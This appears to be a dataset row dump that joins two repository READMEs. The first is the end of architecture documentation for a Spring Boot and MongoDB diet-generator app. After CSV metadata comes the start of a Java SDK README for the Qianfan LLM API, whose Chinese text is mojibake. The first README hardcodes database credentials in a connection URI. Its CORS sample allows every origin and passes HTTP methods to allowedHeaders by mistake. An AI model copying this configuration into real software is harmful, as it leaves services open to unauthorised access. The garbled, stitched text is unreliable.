                double valueToAdd = grams.setScale(1, RoundingMode.HALF_UP).doubleValue();
                if (currentValue != null) {
                    valueToAdd += currentValue;
                }
                shoppingList.put(product.getName(), valueToAdd);
            });
        }));
        return shoppingList;
    }
}
```

[//]: # (![ShoppingListGenerator Code screenshot]&#40;/screenshots/shoppinglistgenerator_code_ss.png&#41;)

# 4. Application

The application layer contains actual business logic and usage of domain layer. It orchestrates use cases, and indicate
interfaces that need to be implemented to provide correct functionality of the application. It is important to note
here, that
this layer, same as domain layer, is free from frameworks and libraries.

## 4.1 Repositories

The application require access to database to obtain information about recipes and products. Those database usage is
dictated by interfaces exposed in this layer. As application layer is not depended on actual infrastructure layer, it
doesn't care about what kind of database will provide that information. The only requirement is that those interfaces
need to be implemented correctly in infrastructure layer.

The `ProductRepository`:

```java
public interface ProductRepository {

    Product save(Product product);

    Product getProduct(String productName);

    Product getProduct(UUID uuid);

}
```

The `RecipeRepository` :

```java
public interface RecipeRepository {

    Recipe save(Recipe recipe);

    List<Recipe> findAllByDietAndMealTypes(DietType dietType, MealType mealType);

    List<Recipe> findByName(String name);

}
```

## 4.2 Use Cases

The use cases are actual usage of domain layer, should contain only one concrete business usage of application. From
code perspective, it has to have only one public method, but can have unlimited private methods.

To keep this layer free from framework and libraries, those use cases need to be registered in `BeanConfiguration` class
in infrastructure layer.
That allows them to be injected in presentation layer in controllers. See infrastructure layer documentation to discover
details.

The implementation of `CalculateBMIUseCase` and `CalculateTDEEUseCase` is quite simple and straightforward and consist
of actual calculator method call.

The `CalculateDietUseCase` is interesting use case. This class need to actually use the logic created in domain layer.
It is next layer of abstraction, none of low level implementation is presented here. Only actual usage.

```java

@Override
public Diet createDiet(DietAttributes dietAttributes) {

    Macronutrient macronutrient = calculateMacronutrients(dietAttributes);
    Map<MealType, List<Recipe>> allRecipes = getAllSegregatedRecipes(dietAttributes.dietType());

    DietGenerator dietGeneratorImpl = new DietGeneratorImpl(
            dietAttributes.numberOfMeals(),
            macronutrient,
            allRecipes);

    return dietGeneratorImpl.generateDiet();
}
```

First `Macronutrient` is calculated using private method where `MacroCalculator` is created
using `MacroCalculatorFactory`.

```java
private Macronutrient calculateMacronutrients(DietAttributes dietAttributes) {
    MacroCalculator macroCalculator = MacroCalculatorFactory.getMacroCalculator(dietAttributes.dietType());
    MacroCalculatorAttributes macroCalculatorAttributes = new MacroCalculatorAttributes(
            dietAttributes.requiredCalories(),
            dietAttributes.bodyWeightInKg(),
            dietAttributes.gender());
    return macroCalculator.calculate(macroCalculatorAttributes);
}
```

Next, the list of `Recipes` is fetched from the database and segregated by the `MealType` and stored in the `Map`.
Once all data is gathered to perform diet generation, the `DietGeneratorImpl` object is created and method generateDiet
is used to create `Diet`.
Rest logic happened in the generator class itself and ready object is returned to the presentation layer where is mapped
to the `Response` and returned to the user.

# 5. Infrastructure

---


In the infrastructure layer, we find all configurations, external API integrations, and persistence connections. This
application currently uses the Spring Boot 3 framework, so all configurations related to Spring will be kept in this
layer. In addition to the framework, the application utilizes a MongoDB database and the CalorieNinjas external API to
populate Products.

## 5.1 Spring Boot configuration

### 5.1.1 Bean Configuration

The application uses a clean architecture approach, meaning that the domain and application layers must be kept separate
from framework dependencies. As mentioned in the architecture documentation, there is a specific way to achieve this. We
need to register `UseCases` classes from the application layer with `@Bean` in the `@Configuration` layer. This allows
us to
inject these classes into other components within the application while keeping domain and application layers framework
free.

Since the application is relatively small, the configuration file is also small.

Here is a sample `@Bean` registration method:

```java

@Configuration
public class BeanConfiguration {

    @Bean
    public CreateDiet dietService(RecipeRepository recipeRepository) {
        return new CreateDietUseCase(recipeRepository);
    }
}
```

[//]: # (![Bean registration screenshot]&#40;/screenshots/bean_registration_ss.png&#41;)

### 5.1.2 Cors Configuration

Cross-Origin Resource Sharing (CORS) is a security feature implemented by web browsers that allows or restricts web
pages from making requests to a different domain than the one that served the web page. This is done to prevent
potentially malicious websites from accessing sensitive data on other sites without the user's knowledge.

To allows users utilize this application from the browser, cors configuration need to be implemented.
The application has presentation Single-Page Application and endpoints are exposed by Spring MVC, the basic config is
provided. It is highly
recommended to
adjust these settings for your needs.

```java

@Configuration
public class CorsConfiguration {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping(""/api/**"")
                        .allowedHeaders(""GET"", ""POST"")
                        .allowedOrigins(""*"")
                        .allowedHeaders(""*"");
            }
        };
    }

}
```

[//]: # (![CORS config screenshot]&#40;/screenshots/cors_config_ss.png&#41;)

### 5.1.3 Error Handling

When ever error is thrown in the application, we can catch it and return custom response to the user.
To achieve this, application utilize `@ControllerAdvice` component and register errors to be handled in this class. In
all cases `ExceptionResponse` dto is returned to the user with message, date and description. See presentation layer for
details about dto.

```java

@ControllerAdvice
public class GlobalExceptionHandler extends ResponseEntityExceptionHandler {

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<ExceptionResponse> handleIllegalArgumentException(
            ResourceNotFoundException exception, WebRequest webRequest) {

        ExceptionResponse errorDto = new ExceptionResponse(
                exception.getMessage(),
                new Date(),
                webRequest.getDescription(false));

        return new ResponseEntity<>(errorDto, HttpStatus.NOT_FOUND);
    }
}
```

[//]: # (![GlobalExceptionHandler config screenshot]&#40;/screenshots/global_exception_handler_ss.png&#41;)

## 5.2 Calories Ninjas

This application leverages the CalorieNinjas external API to gather information about `Products`. CalorieNinjas offers a
straightforward registration process and user-friendly endpoints. The free tier allows for up to 10,000 requests per
month.

During application startup, the database is populated using data from CalorieNinjas. If a product is already present in
the database, the API call is skipped to optimize performance and reduce unnecessary requests.

The `Products` to fetch are indicated in the `recipe.txt` list in the resources' folder. The `RecipeInit` class is the
parser for that list, and it uses `NinjaService` where `NinjaApi` class is injected.
Special format need to be kept if you decide to extend that list.

![Recipe List screenshot](/screenshots/recipe_list_ss.png)

First line `*` indicate the beginning of the list, followed by properties always in the same order, each properties need
to contain `:` and no space:

- Name (name of your recipe)
- HowTo (preparation steps)
- DietType (High Protein (the only supported diet right now))
- MealType (it can be list, each element separated by `/` sign. See domain layer for available meals)
- Scalable (true or false)

After properties list of products need to appear each in separate line enclosed by `**` from top and bottom line.
The format is as follows:

`name:grams/Filler`

The `name` in this format will be requested by the api. For `Filler` see the domain layer documentation. The `grams`
properties need to be given as integer.

The last line `***` indicate end of the recipe to parse.

The `NinjaApi` will fetch data using `RestClient`, provided by the Spring dependency library, from the CaloriesNinja api
and generate `NinjaReponse` that holds the list of `NinjaItems`.
First `NinjaItem` found in `NinjaResponse` will be mapped to the `Product` and saved to the database
using `ProductService`.

## 5.3 Persistence

This application utilize MongoDB which is easy to use NoSQL database. As Clean Architecture is used in this project,
each `@Document` has special implementation flow. Database connection configuration is very simple, it consists of one
line located in
`application.properties` file and `MongoDBConfiguration` class where packages is specified to scan. 

``` application.properties
spring.data.mongodb.uri=mongodb://fatatu:fatatu@mongo:27017/diet-generator?authSource=admin
```

```java
@Configuration
@EnableMongoRepositories(basePackages = ""org.ectimel.dietgenerator.infrastructure.persistance.mongo.repositories"")
public class MongoDBConfiguration {
}
```


Note that Docker Compose is used in this project, which means the uri address is service name
from `docker-compose.yaml`.

### 5.3.1 Documents

Currently, application has 2 main documents `ProductDocument` and `RecipeDocument`. I decided to use `UUID` as id in
each
document in this application. To achieve that, special abstract class `MongoUUIDEntity` that holds id as `UUID` type was
created.
It also contains setter method that is used during serialization if id is not presented.

```java

@Getter
@SuperBuilder
@NoArgsConstructor
public abstract class MongoUUIDEntity {

    @Id
    protected UUID id;

    public void setId(UUID id) {
        if (this.id != null) throw new UnsupportedOperationException(""ID is already defined"");

        this.id = id;
    }
}
```

[//]: # (![MongoUUID screenshot]&#40;/screenshots/mogouuid_ss.png&#41;)

Each actual document need to extend that class to provide `UUID` as ID. Special `@Component` is created that listen
for `BeforeConvertEvent` and will assign the UUID.

```java

@Component
public class UuidEntityEventListener extends AbstractMongoEventListener<MongoUUIDEntity> {

    @Override
    public void onBeforeConvert(BeforeConvertEvent<MongoUUIDEntity> event) {
        super.onBeforeConvert(event);
        MongoUUIDEntity mongoUUIDEntity = event.getSource();

        if (mongoUUIDEntity.getId() == null) {
            mongoUUIDEntity.setId(UUID.randomUUID());
        }
    }

}
```

[//]: # (![Before Convert Event screenshot]&#40;/screenshots/beforeConvert_event_ss.png&#41;)

### 5.3.2 Mappers

Each document need to have its own mapper that will map `@Document` to domain object and from domain to `@Document`.
This step is mandatory to separate domain and infrastructure layers. `DomainMapper` generic interface is created to be
implemented by actual mappers. Some inner classes that are used to represent data but are not actual `@Documents` also
needs mappers. For example `NutrientInformation` class.

```java
public interface DomainMapper<D, E> {
    D mapToDomain(E entityObject);

    E mapFromDomain(D domainObject);
}
```

[//]: # (![Domain Mapper screenshot]&#40;/screenshots/domain_mapper_ss.png&#41;)

### 5.3.3 Repositories

As mentioned before, the domain layer expose interfaces that need to be implemented to provide reading from and writing
to database.
Those repositories classes are prefixed with `Mongo` and suffixed with `Impl` and those classes are injected into
the `UseCases` that are registered by `BeanConfiguration` class.

To utilize SpringJDBC we need to perform additional step. For each `@Document` we need to create the interface that will
extend
`MongoRepository<T, ID>` interface. This repository extend `CrudRepository` and is adjusted to handle custom
mongo `@Query`. Those interfaces always have prefix `SpringDataMongo`

```java
public interface SpringDataMongoProductRepository extends MongoRepository<ProductDocument, UUID> {

    @Query(""{ 'name' : ?0 }"")
    Optional<ProductDocument> findByName(String name);

}
```

[//]: # (![Spring Data Repo screenshot]&#40;/screenshots/spring_data_repo_ss.png&#41;)

Once we have our interfaces we inject them in to the classes that implement exposed by domain layer interfaces to
actually perform writing to and reading from database.

```java

@Repository
@Qualifier(""mongoProductRepository"")
public class MongoProductRepositoryImpl implements ProductRepository {

    private final SpringDataMongoProductRepository productRepository;
    private final ProductMapper productMapper;

    public MongoProductRepositoryImpl(SpringDataMongoProductRepository productRepository, ProductMapper productMapper) {
        this.productRepository = productRepository;
        this.productMapper = productMapper;
    }

    @Override
    public Product save(Product product) {
        ProductDocument savedProduct = productRepository.save(productMapper.mapFromDomain(product));
        return productMapper.mapToDomain(savedProduct);
    }
}
```

[//]: # (![Mongo Impl Repo screenshot]&#40;/screenshots/mongo_impl_ss.png&#41;)

This way we keep our domain layer free from frameworks. To look at it from another angle see the diagram below.

![Repositories UML screenshot](/screenshots/repositories_uml.png)

# 6. Presentation

---

The presentation layer is responsible for handling user interface logic. It interacts with the user, displaying data and
capturing user input, and then communicates this data to the underlying application layers without containing any
business logic itself.

Currently, the application expose rest controllers to the user that can be used to perform some operations. Those
controllers are:
`CalculatorController`, `DietController`, `ProductController`, `RecipeController`. All controllers paths are prefixed
with
`/api/v1/` to indicate usage of api and the version.

For details please visit the [SWAGGER](link) documentation.

Each endpoint has its own response object, suffixed with `Response`. If endpoint is of type `POST` and
require `@RequestBody` object, it has dto object suffixed with `Request`. Every other dto object (inner objects) are
suffixed with `Dto`.

DTOs objects are used to transfer data to the user, we would like to avoid responds with domain objects. To achieve
these,
mappers classes ware created. Some, complex `Request` objects has built method mapToDomain() to simplify complexity.

```java
public DietAttributes mapToDomain() {
    return new DietAttributes(
            BigDecimal.valueOf(this.kcal()),
            DietType.fromValue(this.dietType()),
            BigDecimal.valueOf(this.numberOfMeals()),
            BigDecimal.valueOf(this.bodyWeightInKg()),
            Gender.stringToGender(this.gender()));
}
```

## 6.1 Controllers endpoints:

Most important is `DietController`, it expose one endpoint for diet generation:

`/api/v1/` with `POST` method.

```java

@PostMapping
public ResponseEntity<DietResponse> generateDiet(@Valid @RequestBody DietRequest dietRequest) {
    Diet diet = createDiet.createDiet(dietRequest.mapToDomain());
    return ResponseEntity.ok(dietMapper.mapToDietResponse(diet));
}
```

This endpoint require validated `DietRequest` dto and simple implementation in json format is presented below.

```json
{
  ""kcal"": ""3000"",
  ""dietType"": ""High Protein"",
  ""numberOfMeals"": ""5"",
  ""bodyWeightInKg"": 100,
  ""gender"": ""MALE""
}
```

It returns `DietResponse` object:

```java
public record DietResponse(List<DishDto> dishes, NutrientDto nutrition, Map<String, Double> shoppingList) {
}
```

The `CalculatorController` provide 2 endpoints.

`/api/v1/tdee` with `POST` method

```java

@PostMapping(""/tdee"")
public ResponseEntity<TDEEResponse> calculateTDEE(@RequestBody TDEERequest TDEERequest) {
    Double TDEE = TDEECalculator.calculateTDEE(TDEERequest.mapToDomain()).doubleValue();
    return ResponseEntity.ok(new TDEEResponse(TDEE + ""kcal""));
}
```

This endpoint require validated `TDEERequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174,
  ""age"": 30,
  ""gender"": ""maasdlae"",
  ""activityLevel"": ""MODERATELY""
}
```

`/api/v1/bmi` with `POST` method

```java

@PostMapping(""/bmi"")
public ResponseEntity<BMIResponse> calculateBMI(@RequestBody BMIRequest BMIRequest) {
    Double result = calculateBMI.calculate(
                    BigDecimal.valueOf(BMIRequest.bodyWeightInKg()),
                    BigDecimal.valueOf(BMIRequest.heightInCm()))
            .doubleValue();

    return ResponseEntity.ok(new BMIResponse(result));
}
```

This endpoint require validated `BMIRequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174
}
```

The `RecipeController` expose endpoint to fetch information about recipes.

`/api/v1/{recipeName}` with `GET` method and require path variable.

```java

@GetMapping(""/{recipeName}"")
public ResponseEntity<RecipeResponse> getProductByName(@PathVariable String recipeName) {
    List<Recipe> recipeList = recipeService.getRecipe(recipeName);
    List<RecipeDto> recipeDto = recipeList
            .stream()
            .map(recipeDtoMapper::mapFromDomain)
            .toList();
    return ResponseEntity.ok(new RecipeResponse(recipeDto));
}
```

The `ProductController` expose endpoint to fetch information about products.

`/api/v1/{productName}` with `GET` method and require path variable.

```java

@GetMapping(""/{productName}"")
public ResponseEntity<ProductResponse> getProductByName(@PathVariable String productName) {
    Product product = productService.getProduct(productName);
    ProductDto productDto = productDtoMapper.mapFromDomain(product);
    return ResponseEntity.ok(new ProductResponse(List.of(productDto)));
}
```

# 7. Docker

---

The application uses Docker and Docker Compose to simplyfy deployment and configuration on other machines.
The `docker-compose.yaml` consist of 4 services - mongo, mongo-express, spring-boot-app, and react-vite.
First two are database related services where mongo-express allows us to explore database using graphical user
interface.

Dockerfile for react application:

```dockerfile
FROM node:18.20.2-alpine

WORKDIR /app

COPY package.json .

RUN npm install -g npm@10.5.1
RUN npm install -g typescript
RUN npm install

COPY . .

RUN npm run build

EXPOSE 5173

CMD [ ""npm"", ""run"", ""preview"" ]
```

Dockerfile for Spring Boot app, note that it use multistage approach. First jar file is built, and secondly application
is started from that jar file.

```dockerfile
FROM maven:3.9 as BUILD
WORKDIR /app
COPY pom.xml /app
RUN mvn dependency:resolve
COPY . /app
RUN mvn clean
RUN mvn package -DskipTests -X

FROM amazoncorretto:21
COPY --from=BUILD /app/target/*.jar app.jar
EXPOSE 8080
CMD [""java"", ""-jar"", ""app.jar""]
```

# 8. Inspirations

1. https://github.com/kgrzybek/modular-monolith-with-ddd
2. Clean Architecture
3. Fitatu - https://www.fitatu.com/

# THE END! 






",0,0,1,0.0,"['fatatu', 'diet', 'generator', 'technology', 'stack', 'backend', 'frontend', 'live', 'application', 'http', 'http', 'how', 'to', 'run', 'it', 'on', 'your', 'local', 'machine', 'make', 'sure', 'docker', 'docker', 'compose', 'instal', 'obtain', 'calorieninjas', 'api', 'key', 'install', 'git', 'clone', 'github', 'repository', 'set', 'environment', 'variable', 'start', 'docker', 'compose', 'commits', 'documentation', 'introduction', 'about', 'importance', 'documentation', 'what', 'fatatu', 'why', 'repository', 'exists', 'disclaimer', 'star', 'share', 'architecture', 'clean', 'architecture', 'model', 'system', 'context', 'container', 'component', 'code', 'calculator', 'component', 'code', 'diet', 'generator', 'component', 'code', 'ninja', 'service', 'component', 'domain', 'how', 'human', 'body', 'work', 'how', 'kcal', 'work', 'bmi', 'tdee', 'tef', 'data', 'representation', 'product', 'product', 'code', 'screenshot', 'filler', 'filler', 'code', 'screenshot', 'nutrient', 'nutrient', 'code', 'screenshot', 'calorie', 'code', 'screenshot', 'carbohydrate', 'code', 'screenshot', 'protein', 'code', 'screenshot', 'fat', 'code', 'screenshot', 'recipe', 'recipe', 'code', 'screenshot', 'mealtype', 'mealtype', 'code', 'screenshot', 'diettype', 'mealtype', 'code', 'screenshot', 'bigdecimal', 'bigdecimal', 'code', 'usage', 'screenshot', 'dish', 'dish', 'code', 'screenshot', 'diet', 'diet', 'code', 'screenshot', 'calculator', 'bmicalculator', 'bmicalculator', 'code', 'screenshot', 'bmrcalculator', 'bmrcalculator', 'code', 'screenshot', 'mifflincalculator', 'code', 'screenshot', 'bmrattributes', 'code', 'screenshot', 'basemetabolicrate', 'code', 'screenshot', 'activelevel', 'code', 'screenshot', 'macrocalculator', 'macrocalculator', 'code', 'screenshot', 'macrocalculatorfactory', 'code', 'screenshot', 'macrocalculator', 'code', 'screenshot', 'highproteinmacrocalculator', 'code', 'screenshot', 'macronutrient', 'code', 'screenshot', 'generator', 'dietgenerator', 'dietgeneratorimpl', 'member', 'constructor', 'code', 'screenshot', 'dietgeneratorimpl', 'generate', 'code', 'screenshot', 'dietgeneratorimpl', 'adddishes', 'code', 'screenshot', 'dish', 'createdish', 'code', 'screenshot', 'dietgenerator', 'adjustmacronutrient', 'code', 'screenshot', 'diet', 'increase', 'macro', 'code', 'screenshot', 'dish', 'increasefiller', 'code', 'screenshot', 'dish', 'reducefiller', 'code', 'screenshot', 'shoppinglistgenerator', 'shoppinglistgenerator', 'code', 'screenshot', 'application', 'repository', 'use', 'case', 'infrastructure', 'spring', 'boot', 'configuration', 'bean', 'configuration', 'bean', 'registration', 'screenshot', 'cors', 'configuration', 'cors', 'config', 'screenshot', 'error', 'handle', 'globalexceptionhandler', 'config', 'screenshot', 'calorie', 'ninja', 'persistence', 'document', 'mongouuid', 'screenshot', 'before', 'convert', 'event', 'screenshot', 'mapper', 'domain', 'mapper', 'screenshot', 'repository', 'spring', 'data', 'repo', 'screenshot', 'mongo', 'impl', 'repo', 'screenshot', 'presentation', 'controller', 'endpoint', 'docker', 'inspiration', 'the', 'end']","['screenshot', 'code', 'diet', 'dish', 'docker']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
oldmanpushcart/qianfan4j,main,"# qianfan4jï¼šåƒå¸† Java SDK
![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)
![JDK17+](https://img.shields.io/badge/JDK-17+-blue.svg)
![LLM-æ–‡å¿ƒä¸€è¨€](https://img.shields.io/badge/LLM-%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80-blue.svg)

`qianfan4j`æ˜¯ä¸€ä¸ªå¼€æºçš„åƒå¸†å¤§æ¨¡å‹å¹³å°çš„éå®˜æ–¹Javaå®¢æˆ·ç«¯ï¼ŒåŸºäº`JDK17`æ„å»ºã€‚å®ƒæ—¨åœ¨æä¾›ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œã€æ˜“äºé›†æˆå’Œä½¿ç”¨çš„Javaåº“ï¼Œä»¥ä¾¿å¼€å‘è€…èƒ½å¤Ÿé€šè¿‡åƒå¸†APIè½»æ¾å®ç°å¯¹è¯ã€ç»­å†™ã€å‘é‡åµŒå…¥å’Œå›¾åƒå¤„ç†ç­‰åŠŸèƒ½ã€‚

> è¯·æ³¨æ„ï¼šåœ¨ä½¿ç”¨`qianfan4j`æ—¶ï¼Œä½ éœ€è¦éµå®ˆåƒå¸†APIçš„ä½¿ç”¨æ¡æ¬¾å’Œæ¡ä»¶ã€‚

## ä¸€ã€ä¸»è¦åŠŸèƒ½

`qianfan4j`æ”¯æŒä»¥ä¸‹åƒå¸†APIåŠŸèƒ½ï¼š

- **å¯¹è¯ï¼ˆChatï¼‰**
    - æä¾›ç”¨æˆ·ä¸åƒå¸†æ¨¡å‹è¿›è¡Œè‡ªç„¶è¯­è¨€å¯¹è¯ã€‚
    - æ”¯æŒç”¨æˆ·åœ¨ä¸€æ¬¡å¯¹è¯ä¸­è§¦å‘å¤šä¸ªå‡½æ•°è°ƒç”¨ã€‚

- **ç»­å†™ï¼ˆCompletionsï¼‰**
    - æä¾›æ–‡æœ¬ç»­å†™åŠŸèƒ½ï¼Œå¯ä»¥æ ¹æ®ç»™å®šçš„æ–‡æœ¬ç‰‡æ®µç”Ÿæˆåç»­å†…å®¹ã€‚

- **å‘é‡ï¼ˆEmbeddingsï¼‰**
    - å°†æ–‡æœ¬è½¬æ¢ä¸ºå‘é‡è¡¨ç¤ºï¼Œç”¨äºæ–‡æœ¬ç›¸ä¼¼åº¦æ¯”è¾ƒã€èšç±»ç­‰ä»»åŠ¡ã€‚

- **å›¾åƒï¼ˆImagesï¼‰**
    - **å›¾ç”Ÿæ–‡ï¼š** æ ¹æ®æä¾›çš„å›¾åƒç”Ÿæˆæè¿°æ€§æ–‡æœ¬ã€‚
    - **æ–‡ç”Ÿå›¾ï¼š** å°†æ–‡æœ¬æè¿°è½¬æ¢ä¸ºç›¸åº”çš„å›¾åƒã€‚

- **æ’ä»¶åº”ç”¨ï¼ˆPluginï¼‰**
    - **çŸ¥è¯†åº“ï¼š** è®©å¼€å‘è€…ï¼ˆç”šè‡³éæŠ€æœ¯äººå‘˜ï¼‰ä»¥ç®€å•çš„æ–¹å¼ç®¡ç†æ•°æ®é›†ï¼ŒåŒ…æ‹¬åˆ†ç‰‡ã€æ¸…æ´—ã€å‘é‡è®¡ç®—ç­‰èƒ½åŠ›ã€‚
    - **æ™ºæ…§å›¾é—®ï¼š** å›¾ç‰‡ç†è§£è¯†åˆ«ï¼Œå¹¶å¯¹å›¾ç‰‡å†…å®¹è¿›è¡Œæ€»ç»“æ¦‚è¿°ï¼Œè¾“å‡ºç”¨æˆ·å¯ç†è§£çš„å¥å­æˆ–æ®µè½ã€‚
    - **ç™¾åº¦æœç´¢ï¼š** ç™¾åº¦æœç´¢æ’ä»¶,å®æ—¶è·å–æ–°é—»ã€è‚¡ç¥¨ä¿¡æ¯ç­‰
    - **ç½‘é¡µè§£æï¼š** ä»ä»»ä½•ç½‘é¡µé“¾æ¥è·å–æ‰€éœ€æ–‡æœ¬ä¿¡æ¯
    - **å¤©æ°”æŸ¥è¯¢ï¼š** è¾“å…¥åœ°å€ï¼Œç»™å‡ºå½“å‰è¯¥åœ°å€å¤©æ°”ï¼›è¾“å…¥åœ°å€+æ—¶é—´ï¼Œç»™å‡ºè¯¥åœ°å€æ—¶é—´æ®µå†…çš„å¤©æ°”

## äºŒã€ç³»ç»Ÿè¦æ±‚

1. **JDK17**æˆ–æ›´é«˜ç‰ˆæœ¬

## ä¸‰ã€è·‘é€šæµ‹è¯•

1. åˆ°[ç™¾åº¦æ™ºèƒ½äº‘](https://cloud.baidu.com/)ä¸Šæ³¨å†Œä¸€ä¸ªè´¦å·
2. åœ¨ç™¾åº¦æ™ºèƒ½äº‘ä¸Š[åˆ›å»ºä¸€ä¸ªåº”ç”¨](https://console.bce.baidu.com/qianfan/ais/console/applicationConsole/application)ï¼Œä½ å°†ä¼šå¾—åˆ°ä¸€ä¸ªAPI Keyå’Œä¸€ä¸ªSecret Key
3. å£°æ˜ç¯å¢ƒå˜é‡ï¼š
   ```shell
   export QIANFAN_AK=<YOUR APP-KEY>
   export QIANFAN_SK=<YOUR SECRET-KEY>
   ```
   æ³¨æ„ï¼š[PluginAppTestCase](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/pluginapp/PluginAppTestCase.java)
   æµ‹è¯•ç”¨ä¾‹å¦‚æœè¦è·‘é€šï¼Œéœ€è¦åœ¨åƒå¸†å¤§æ¨¡å‹å¹³å°åˆ›å»ºæ’ä»¶åº”ç”¨ï¼Œå¼€é€š`ocr-chat`æ’ä»¶ã€‚ å¹¶åœ¨é…ç½®æ–‡ä»¶ä¸­è¿½åŠ ä¸€è¡Œ
   ```shell
   export QIANFAN_PLUGIN_APP_ID=<YOUR PLUGIN-APP ID>
   ```
4. è¿è¡Œæµ‹è¯•ç”¨ä¾‹ï¼š`mvn test`

## å››ã€ä¾èµ–ä½¿ç”¨

é¡¹ç›®ä»“åº“æ‰˜ç®¡åœ¨Mavenä¸­å¤®ä»“åº“ï¼Œä½ å¯ä»¥åœ¨`pom.xml`ä¸­æ·»åŠ ä»¥ä¸‹ä¾èµ–ï¼š
```xml
<dependency>
    <groupId>io.github.oldmanpushcart</groupId>
    <artifactId>qianfan4j</artifactId>
    <version>1.0.0</version>
</dependency>
```

### åˆ›å»ºå®¢æˆ·ç«¯

```java
// çº¿ç¨‹æ± 
final var executor = Executors.newFixedThreadPool(10);

// åƒå¸†å®¢æˆ·ç«¯
final var client = QianFanClient.newBuilder()
    .ak(""***"") // API Key
    .sk(""***"") // Secret Key
    .executor(executor)
    .connectTimeout(Duration.ofSeconds(30))
    .build();
```

### å¯¹è¯ç¤ºä¾‹

```java
// å¯¹è¯è¯·æ±‚
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .messages(Message.ofUser(""hello!""))
    .build();

// å¯¹è¯å“åº”
final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response);
```

è¾“å‡ºç»“æœ

```text
2024-03-10 17:53:43 DEBUG qianfan://token/refresh success! expired=1712656423872;
2024-03-10 17:53:43 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""hello!""}]}
2024-03-10 17:53:45 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-7sntu8vk0p"",""object"":""chat.completion"",""created"":1710064425,""result"":""ä½ å¥½ï¼å¾ˆé«˜å…´ä¸ä½ äº¤æµã€‚æœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿè¯·éšæ—¶å‘Šè¯‰æˆ‘ã€‚"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":2,""completion_tokens"":16,""total_tokens"":18}}
ä½ å¥½ï¼å¾ˆé«˜å…´ä¸ä½ äº¤æµã€‚æœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿè¯·éšæ—¶å‘Šè¯‰æˆ‘ã€‚
```

### å‡½æ•°è°ƒç”¨ç¤ºä¾‹

åœ¨`qianfan4j`ä¸­è¿›è¡Œå‡½æ•°çš„å£°æ˜å°†ä¼šå˜æˆä¸€ä¸ªéå¸¸ç®€å•çš„äº‹æƒ…ã€‚æ¡†æ¶è‡ªåŠ¨å¸®ä½ å®Œæˆäº†å‡½æ•°çš„å£°æ˜å’Œå‚æ•°çš„è§£æã€‚è¿™æ ·ï¼Œä½ å°±å¯ä»¥ä¸“æ³¨äºå‡½æ•°çš„å®ç°ï¼Œè€Œä¸ç”¨å†å»å…³å¿ƒå‡½æ•°çš„å£°æ˜å’Œå‚æ•°çš„è§£æäº†ã€‚

å‡½æ•°å£°æ˜

```java
@ChatFn(name = ""echo"", description = ""echo words"", examples = {
    @ChatFn.Example(
        question = ""echo: words"",
        thoughts = ""å½“ç”¨æˆ·è¾“å…¥echo:å¼€å¤´çš„æ¶ˆæ¯æ—¶ï¼Œæœºå™¨äººä¼šåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯"",
        arguments = """"""
            {
                ""words"": ""hello, world""
            }
            """"""
    )
})
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

    @Override
    public CompletableFuture<Echo> call(Echo echo) {
        return CompletableFuture.completedFuture(new Echo(echo.words()));
    }

    public record Echo(String words) {

    }

}
```

å¯¹è¯è§¦å‘å‡½æ•°è°ƒç”¨

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new EchoFunction())
    .messages(Message.ofUser(""echo: HELLO WORLD!""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

è¾“å‡ºç»“æœ

```text
2024-03-10 17:58:37 DEBUG qianfan://token/refresh success! expired=1712656717750;
2024-03-10 17:58:37 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""å½“ç”¨æˆ·è¾“å…¥echo:å¼€å¤´çš„æ¶ˆæ¯æ—¶ï¼Œæœºå™¨äººä¼šåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯""}}]]}]}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-aqte3cvapb"",""object"":""chat.completion"",""created"":1710064720,""result"":"""",""is_truncated"":false,""need_clear_history"":false,""function_call"":{""name"":""echo"",""thoughts"":""å½“ç”¨æˆ·è¾“å…¥echo:å¼€å¤´çš„æ¶ˆæ¯æ—¶ï¼Œæœºå™¨äººä¼šåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":112,""completion_tokens"":24,""total_tokens"":136}}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function <= {""words"":""HELLO WORLD!""}
